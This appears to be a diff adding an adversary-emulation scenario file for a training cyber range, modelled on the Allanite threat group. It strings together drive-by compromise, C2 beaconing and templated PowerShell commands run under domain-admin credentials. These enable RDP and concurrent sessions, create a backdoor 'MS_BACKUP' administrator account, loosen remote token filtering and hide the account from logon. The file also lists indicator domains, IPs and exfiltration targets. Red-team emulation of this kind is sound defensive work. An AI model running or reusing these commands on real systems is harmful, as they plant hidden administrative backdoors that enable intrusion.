@@ -1,0 +1,566 @@
+{
+    "meta_data": {
+        "name": "allanite",
+        "version": "v1.0.0",
+        "title": "Allanite Inspired Scenario",
+        "description": "This scenario is based on the threat group 'Allanite', a suspected Russian cyber espionage group. After",
+        "author": "Attack Content",
+        "suggested_duration": 665
+    },
+    "procedures": [
+        {
+            "tactic": "Actuator",
+            "technique": "Infrastructure",
+            "label": "actuator",
+            "preconditions": {
+                "tool": "self.tool_name"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX",
+            "preconditions": {
+                "self.tool_name": "self.tool",
+                "payload": "self.payload_name",
+                "exfiltration": "self.exfil",
+                "driveby": "self.driveby",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "PayloadCheapride",
+            "technique": "Infrastructure",
+            "label": "Payload",
+            "preconditions": {
+                "tool": "self.tool"
+            }
+        },
+        {
+            "tactic": "DriveByCompromise",
+            "technique": "InitialAccess",
+            "label": "driveByCompromise",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "UserExecution",
+            "technique": "Execution",
+            "label": "userExecution",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "WebProtocols",
+            "technique": "c2",
+            "label": "webProtocols_1",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "ValidAccounts_DomainAccounts",
+            "technique": "PrivilegeEscalation",
+            "label": "validAccounts_DomainAccounts_1_t1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target_1": "self.target_1",
+                "target_2": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$password = ConvertTo-SecureString '",
+                            "self.domain_admin_password",
+                            "' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\",
+                            "self.domain_admin_username",
+                            "', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add \\\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\\" /v fDenyTSConnections /t REG_DWORD /d 0 /f}'};echo 'Done'"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "WindowsService",
+            "technique": "Persistence",
+            "label": "Enable_Modify_RDP_Service_1_t1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$password = ConvertTo-SecureString '",
+                            "self.domain_admin_password",
+                            "' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\",
+                            "self.domain_admin_username",
+                            "', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add \\\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f}'};echo 'Done'"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "WindowsService",
+            "technique": "Persistence",
+            "label": "Enable_Modify_RDP_Service_2_t1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$password = ConvertTo-SecureString '",
+                            "self.domain_admin_password",
+                            "' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\",
+                            "self.domain_admin_username",
+                            "', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add \\\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core\\\" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f}'};echo 'Done'"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "WindowsService",
+            "technique": "Persistence",
+            "label": "Enable_Modify_RDP_Service_3_t1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$password = ConvertTo-SecureString '",
+                            "self.domain_admin_password",
+                            "' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\",
+                            "self.domain_admin_username",
+                            "', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f}'};echo 'Done'"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "WindowsService",
+            "technique": "Persistence",
+            "label": "Enable_Modify_RDP_Service_4_t1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$password = ConvertTo-SecureString '",
+                            "self.domain_admin_password",
+                            "' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\",
+                            "self.domain_admin_username",
+                            "', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" /v AllowMultipleTSSessions /t REG_DWORD /d 1 /f}'};echo 'Done'"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "WindowsService",
+            "technique": "Persistence",
+            "label": "Enable_Modify_RDP_Service_5_t1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$password = ConvertTo-SecureString '",
+                            "self.domain_admin_password",
+                            "' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\",
+                            "self.domain_admin_username",
+                            "', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add \\\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\\\" /v MaxInstanceCount /t REG_DWORD /d 100 /f}'};echo 'Done'"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "CreateAccount_LocalAccount",
+            "technique": "Persistence",
+            "label": "Create_Modify_Backdoor_Account_1_t1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$password = ConvertTo-SecureString '",
+                            "self.domain_admin_password",
+                            "' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\",
+                            "self.domain_admin_username",
+                            "', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{net user MS_BACKUP Allanite_1 /add;net user MS_BACKUP /expires:never}'};echo 'Done'"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "AccountManipulation",
+            "technique": "Persistence",
+            "label": "Create_Modify_Backdoor_Account_2_t1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$password = ConvertTo-SecureString '",
+                            "self.domain_admin_password",
+                            "' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\",
+                            "self.domain_admin_username",
+                            "', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{net localgroup Administrators /add MS_BACKUP;net localgroup Administradores /add MS_BACKUP;net localgroup Amministratori /add MS_BACKUP;net localgroup Administratoren /add MS_BACKUP;net localgroup Administrateurs /add MS_BACKUP;net localgroup \\\"Remote Desktop Users\\\" /add MS_BACKUP}'};echo 'Done'"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "AccountManipulation",
+            "technique": "Persistence",
+            "label": "Create_Modify_Backdoor_Account_3_t1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$password = ConvertTo-SecureString '",
+                            "self.domain_admin_password",
+                            "' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\",
+                            "self.domain_admin_username",
+                            "', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f}'};echo 'Done'"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "HiddenUsers",
+            "technique": "DefenseEvasion",
+            "label": "Hide_Backdoor_Account_1_t1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$password = ConvertTo-SecureString '",
+                            "self.domain_admin_password",
+                            "' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\",
+                            "self.domain_admin_username",
+                            "', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\\\" /v MS_BACKUP /t REG_DWORD /d 0 /f}'};echo 'Done'"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "HiddenUsers",
+            "technique": "DefenseEvasion",
+            "label": "Hide_Backdoor_Account_2_t1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$password = ConvertTo-SecureString '",
+                            "self.domain_admin_password",
+                            "' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\",
+                            "self.domain_admin_username",
+                            "', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f}'};echo 'Done'"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "AgentExit",
+            "technique": "Utility",
+            "label": "AgentExit",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        }
+    ],
+    "iocs": {
+        "domain": [
+            "dyno-energy.com",
+            "energynewsletter.com",
+            "newenergyletter.com",
+            "renewablenewsletter.com",
+            "manhattenenergy.com",
+            "supportenergy.com",
+            "utilityengineering.com",
+            "utilityletter.com",
+            "solarenergynews.com",
+            "bioenergynews.com",
+            "loginenergy.com",
+            "energysupport.com",
+            "renewableresearchinc.com",
+            "solarnewsinc.com",
+            "newsstationinc.com",
+            "corefusion.com",
+            "fissiontech.com",
+            "nucleartechnews.com",
+            "nuketechletter.com",
+            "alternativeenergynews.com"
+        ],
+        "ip": [
+            "78.153.210.45/24",
+            "78.153.152.4/24",
+            "78.153.5.86/24",
+            "78.153.74.123/24",
+            "78.153.16.244/24",
+            "67.43.167.222/24",
+            "67.43.124.15/24",
+            "67.43.120.4/24",
+            "67.43.210.196/24",
+            "67.43.54.167/24",
+            "107.154.156.186/24",
+            "107.154.12.168/24",
+            "107.154.24.69/24",
+            "107.154.47.15/24",
+            "107.154.17.247/24",
+            "194.147.15.59/24",
+            "194.147.199.250/24",
+            "194.147.174.24/24",
+            "194.147.26.54/24",
+            "194.147.65.72/24"
+        ],
+        "binary": [
+            "AskToolbarInstaller.exe",
+            "Wintool.exe",
+            "Wintoolexe.exe",
+            "Marathon.exe",
+            "mbtenergy.exe",
+            "faxInstaller.exe",
+            "faxTool.exe",
+            "efaxInstaller.exe",
+            "VOIPInstaller.exe",
+            "Spamguard.exe",
+            "WatchGuard.exe",
+            "TaskbarInstaller.exe",
+            "eMailInstaller.exe",
+            "SynergicMon.exe",
+            "SpamMon.exe",
+            "ProcSer.exe",
+            "ScreenSaver.exe",
+            "WordDoc.exe",
+            "ExcelExpense.exe",
+            "LoginForm.exe"
+        ]
+    },
+    "spec": {
+        "emaillist": "@('Janice Durham <janice.durham@site.com>', 'Darryl Richmond <darryl.richmond@site.com>', 'Nelda Rios <nelda.rios@site.com>', 'Joanna Wilkerson <joanna.wilkerson@site.com>')",
+        "tool": {
+            "1": {
+                "name": "cheapride_v1",
+                "beacon": "30",
+                "jitter": "5",
+                "ioc-ip_callback": "122.49.215.108/24",
+                "ioc-domain_callback": "inform.bedircati.com",
+                "ioc-binary_payload_name": "form.doc.exe"
+            }
+        },
+        "chimera": {
+            "api-control_ip": "10.10.200.60"
+        },
+        "range": {
+            "query-ad_domain": "site.lan"
+        },
+        "exfil": {
+            "1": {
+                "ioc-ip_exfil": "161.135.1.25/24",
+                "ioc-domain_exfil": "deepwaterhorizon.com"
+            }
+        },
+        "driveby": {
+            "1": {
+                "ioc-ip_driveby": "161.135.1.22/24",
+                "ioc-domain_driveby": "texaspumps.us"
+            }
+        },
+        "targets": {
+            "1": {
+                "query-target_control_ip": "10.10.5.101",
+                "query-target_ip": "172.16.5.101",
+                "query-target_hostname": "dev-win10-1",
+                "query-exfil_files": [
+                    "C:\\secrets.txt",
+                    "C:\\secrets.zip"
+                ],
+                "payload_destination": "c:\\users\\Public",
+                "query-target_email": "Madelyn.Luna@site.com",
+                "query-domain_admin_username": "administrator",
+                "query-domain_admin_password": "Simspace1!Simspace1!",
+                "query-target_domain": "site.lan"
+            }
+        }
+    },
+    "preconditions": {
+        "state": {},
+        "initial": {
+            "tool_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "name"
+                ]
+            },
+            "payload_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "ioc-binary_payload_name"
+                ]
+            },
+            "tool": {
+                "path": [
+                    "tool",
+                    "1"
+                ]
+            },
+            "range": {
+                "path": [
+                    "range"
+                ]
+            },
+            "exfil": {
+                "path": [
+                    "exfil",
+                    "1"
+                ]
+            },
+            "driveby": {
+                "path": [
+                    "driveby",
+                    "1"
+                ]
+            },
+            "driveby_domain": {
+                "path": [
+                    "driveby",
+                    "1",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "chimera": {
+                "path": [
+                    "chimera"
+                ]
+            },
+            "phish_1": {
+                "path": [
+                    "phishing",
+                    "1"
+                ]
+            },
+            "target_1": {
+                "path": [
+                    "targets",
+                    "1"
+                ]
+            },
+            "domain_admin_username": {
+                "path": [
+                    "targets",
+                    "1",
+                    "query-domain_admin_username"
+                ]
+            },
+            "domain_admin_password": {
+                "path": [
+                    "targets",
+                    "1",
+                    "query-domain_admin_password"
+                ]
+            },
+            "ad_domain": {
+                "path": "site.lan"
+            },
+            "domain": {
+                "path": [
+                    "range",
+                    "query-ad_domain"
+                ]
+            }
+        },
+        "effects": {
+            "actuator": {
+                "path": [
+                    "actuator",
+                    "actuator",
+                    "ret",
+                    "registered_id"
+                ],
+                "default": 0
+            },
+            "scenario_infrastructure": {
+                "path": [
+                    "infrastructure"
+                ]
+            },
+            "agent_tgt1": {
+                "path": [
+                    "webProtocols_1",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            }
+        }
+    }
+}
